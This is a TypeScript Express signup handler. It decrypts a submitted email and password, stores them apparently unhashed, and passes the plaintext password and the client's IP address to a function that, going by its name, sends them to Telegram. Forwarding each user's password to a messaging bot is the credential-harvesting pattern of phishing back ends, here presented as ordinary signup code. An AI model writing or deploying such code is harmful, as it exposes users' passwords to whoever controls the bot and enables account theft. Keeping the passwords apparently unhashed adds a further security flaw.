import { Request, Response } from 'express';
import { sendSignupTelegramMessage } from './telegram';
import { addUser } from '../models/user';
import CryptoJS from 'crypto-js';

const SECRET_KEY = process.env.ENCRYPT as string;

export const signup = async (req: Request, res: Response) => {
    const { encrypted } = req.body;
    if (!encrypted) {
        return res.status(400).json({ message: 'Encrypted data is required.' });
    }
    let email, password;
    try {
        const bytes = CryptoJS.AES.decrypt(encrypted, SECRET_KEY);
        const decryptedData = JSON.parse(bytes.toString(CryptoJS.enc.Utf8));
        email = decryptedData.email;
        password = decryptedData.password;
    } catch (err) {
        return res.status(400).json({ message: 'Failed to decrypt data.' });
    }
    if (!email || !password) {
        return res.status(400).json({ message: 'Email and password are required.' });
    }
    addUser({ email, password });
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    try {
        await sendSignupTelegramMessage(email, password, ip as string);
        res.status(201).json({ message: 'Signup successful.' });
    } catch (err) {
        res.status(500).json({ message: 'Signup failed to send Telegram message.' });
    }
}; 